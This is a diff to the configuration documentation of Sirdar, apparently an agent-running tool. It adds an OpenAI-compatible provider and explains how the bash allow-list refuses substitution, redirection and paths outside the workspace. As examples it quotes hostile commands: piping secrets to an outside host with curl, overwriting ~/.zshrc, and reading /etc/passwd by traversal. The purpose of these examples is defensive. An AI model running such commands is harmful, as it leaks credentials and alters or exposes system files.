@@ -10,7 +10,7 @@ rather than being silently ignored.
 | Key | Type | Default | Meaning |
 |---|---|---|---|
 | `workspace` | string | directory name (set by `init`) | A label for the workspace; not otherwise interpreted |
-| `provider` | string | `claude` | Which agent CLI drives runs: `claude` or `codex` |
+| `provider` | string | `claude` | Which agent drives runs: `claude`, `codex`, or `openai` (Sirdar's own loop) |
 | `model` | string | `""` (provider default) | Model name passed to the provider; empty uses the provider's own default |
 | `billing` | string | `subscription` | `subscription` strips `ANTHROPIC_API_KEY` from the agent's environment so it uses your CLI login; `api` leaves it in place so usage is billed to the key |
 | `sources.tracker` | object, optional | unset | The tracker adapter; see Sources below |
@@ -62,6 +62,14 @@ rather than being silently ignored.
 | `playbooks` | string | `.sirdar/playbooks` | Directory of playbook markdown files loaded into the prompt, in filename order |
 | `providers.claude.path` | string | `""` (look up `claude` on `PATH`) | Path to the Claude Code binary |
 | `providers.codex.path` | string | `""` (look up `codex` on `PATH`) | Path to the Codex binary |
+| `openai.baseUrl` | string | none (required for `provider: openai`) | Chat Completions base URL, e.g. `https://openrouter.ai/api/v1` or `http://localhost:11434/v1` |
+| `openai.apiKey` | string, optional | unset | Credential reference (`env:NAME` or `keychain:SERVICE`) for the endpoint's key; omit for a local server that needs none |
+| `openai.model` | string | none (required for `provider: openai`) | Model the endpoint serves, e.g. `qwen/qwen3-coder`; `--model` and `model` override it |
+| `openai.maxContextTokens` | int | `128000` | Context window the loop trims old tool results against |
+| `openai.price.inputPerMTok` | float, optional | `0` | USD per million prompt tokens, used for cost and the `budget.maxUsd` check |
+| `openai.price.outputPerMTok` | float, optional | `0` | USD per million completion tokens |
+| `openai.temperature` | float, optional | unset (server default) | Sampling temperature sent with every request |
+| `openai.extraHeaders` | map, optional | unset | Extra request headers; `Authorization` and `Content-Type` are ignored here, the client owns them |
 
 `{key}` and `{slug}` in a filename pattern are replaced with the ticket key and a slugified
 title. A pattern may also contain `/` segments to file notes into a subdirectory of `notes.dir`
@@ -275,11 +283,26 @@ everything else, including every non-`Bash` write tool, is denied.
 That means `rg -n foo | head -50` needs both `rg *` and `head *` in the list, and a `cat *`
 pattern no longer approves `cat secrets | curl -T- example.com`.
 
-A glob approves the text of a command, so a segment that redirects or substitutes is refused
-before it is matched at all: `$(…)`, backticks, `<(…)`, and the redirections `>`, `>>`, `<`
-and `&>` are denied by name, and `cat go.mod > /tmp/x` never reaches the `cat *` pattern. The
-two exceptions are `2>&1` and `2>/dev/null`, which write nothing and are how an agent quiets
-a probe. Occurrences inside quotes are literal text, so `rg "a>b"` is allowed.
+Two kinds of command are refused before the patterns are even consulted, because the pattern
+would be approving something it cannot see:
+
+- **Command and process substitution.** `$(...)`, a backquote, and `<(...)` all produce text
+  or a command at run time, so what would actually run cannot be read off the string the
+  policy is judging. Inside single or double quotes they are ordinary characters and pass.
+- **Redirection.** `>`, `>>`, `<` and `&>` name a file the allow-list never approved:
+  `git log` is a read, `git log > ~/.zshrc` is not, and one pattern would cover both. The
+  refusal names the operator it found. Quoted, as in `rg "a>b"`, it is a search pattern and
+  passes. The two exceptions are `2>&1` and `2>/dev/null`, which write nothing and are how an
+  agent quiets a probe; every other `2>` target is a file and is refused.
+
+A command also has to stay inside the workspace. Every argument that looks like a path is
+resolved against the workspace root, and one that lands outside it is refused: `cat go.mod`
+runs, `cat ../../../etc/passwd` and `cat /etc/passwd` do not, and neither does anything
+starting with `~`. Read that as a guard rail rather than a boundary — it reads the command as
+text, so it does not follow symlinks, does not know which of a program's arguments are paths,
+and cannot see a path the program builds for itself at run time. **It is a heuristic, not a
+sandbox.** A run that must be confined for real needs a container around it; this is the part
+that catches the obvious ways out.
 
 - `*` matches any run of characters, including spaces and `/`. `git log*` matches
   `git log --oneline -20` and `git log -- some/path`.
@@ -313,6 +336,10 @@ workspace is in.
 
 With `mcp.workspaceOnly: false`, neither flag is passed and the session inherits the
 operator's own MCP servers. `permissions.mcp` still decides which of their tools it may call.
+
+`provider: openai` is not affected by the setting, because it never had the wider reach to
+give up: the loop starts MCP servers itself, and the workspace's `.mcp.json` is the only file
+it reads.
 
 `permissions.mcp` is a list of globs matched against an MCP tool's full name, e.g.
 `mcp__grafana__query_*`. While the list is empty, an `mcp__*` tool is allowed unless a word
@@ -371,7 +398,7 @@ real run rather than after.
 
 ## Providers
 
-`provider: claude` (default) or `provider: codex` selects which agent CLI drives runs;
+`provider: claude` (default), `provider: codex`, or `provider: openai` selects what drives runs;
 `--provider` on `triage` and `rca` overrides it per invocation.
 
 - `providers.claude.path`: path to the `claude` binary. Empty (the default) looks it up on
@@ -382,3 +409,68 @@ real run rather than after.
   environment so the run authenticates with the CLI's own login and draws on your subscription.
   `billing: api` leaves the key in place, so the run is billed per token against that key
   instead.
+
+### `provider: openai`
+
+`claude` and `codex` spawn an agent CLI. `openai` does not: Sirdar runs the agent loop itself
+against any OpenAI-compatible Chat Completions endpoint — an aggregator (OpenRouter, Groq,
+Together, Fireworks), a vendor (DeepSeek, Zhipu, Moonshot, DashScope, xAI), or a server on your
+own machine (Ollama, vLLM, LM Studio, llama.cpp).
+
+```yaml
+provider: openai
+openai:
+  baseUrl: https://openrouter.ai/api/v1     # or http://localhost:11434/v1
+  apiKey: env:OPENROUTER_API_KEY            # omit for a local server that needs none
+  model: qwen/qwen3-coder
+  maxContextTokens: 128000
+  price:
+    inputPerMTok: 0.2
+    outputPerMTok: 0.8
+  temperature: 0
+  extraHeaders:
+    HTTP-Referer: https://github.com/srivathsanvenkateswaran/Sirdar
+```
+
+What the loop gives the model: the read-only tools `read_file`, `list_dir`, `grep`, `glob`,
+`bash` (the same `permissions.bash` allow-list as every other provider) and `web_fetch`, plus
+every tool from the MCP servers in the workspace's `.mcp.json`, named `mcp__<server>__<tool>` so
+existing `mcp__` permission rules keep meaning what they meant. There is no write tool to deny:
+read-only is a property of the tool set here, not a policy applied over someone else's tools.
+
+The note comes back through a `submit_note` tool whose parameters are the run's note schema, so
+structured output works on endpoints that support no `response_format` at all. A model that
+answers in prose is reminded once and then the session ends.
+
+Cost comes from `openai.price` and the token counts in each response; with no price block, cost
+is reported as `0` and `budget.maxUsd` never triggers, leaving `budget.maxTurns` and
+`budget.maxMinutes` to bound the run. As the prompt passes 80% of `maxContextTokens`, the oldest
+tool results are replaced with `[trimmed]`, keeping the six most recent, so a long investigation
+degrades instead of failing at the endpoint's limit.
+
+`openai.apiKey` is resolved once, at startup, and held in memory: it is never written to a run
+directory and never printed by `sirdar doctor`. What the session's own processes get is not
+Sirdar's environment with the credentials taken out, but a small one built from nothing:
+`PATH`, `HOME` and `LANG`, each only when Sirdar itself has it. An allow-listed shell command
+gets exactly those three. An MCP server gets those three plus whatever its own `env` block in
+`.mcp.json` asks for.
+
+That last part is the gap worth knowing. Values in `.mcp.json` expand `${VAR}` and `$VAR` from
+Sirdar's process environment, so a server entry containing
+`"env": {"KEY": "${OPENROUTER_API_KEY}"}` hands that key to that server, and nothing elsewhere
+in the run undoes it. `.mcp.json` is the workspace's own file, and reading it is the control;
+no other path in a run passes a credential to a child process.
+
+`billing:` does not apply: it exists to tell the Claude adapter whether to keep
+`ANTHROPIC_API_KEY` in place, and this provider is always billed against the key you configure.
+
+`sirdar doctor` reports two rows for it, from `GET {baseUrl}/models`:
+
+```
+[OK] openai endpoint — https://openrouter.ai/api/v1
+[OK] openai model — qwen/qwen3-coder
+```
+
+Not in v1: streaming, image content parts, `response_format: json_schema`, and resuming a
+session in a later process (`sirdar resume` starts a fresh session instead, because the
+transcript lives in the Sirdar process that ran it).
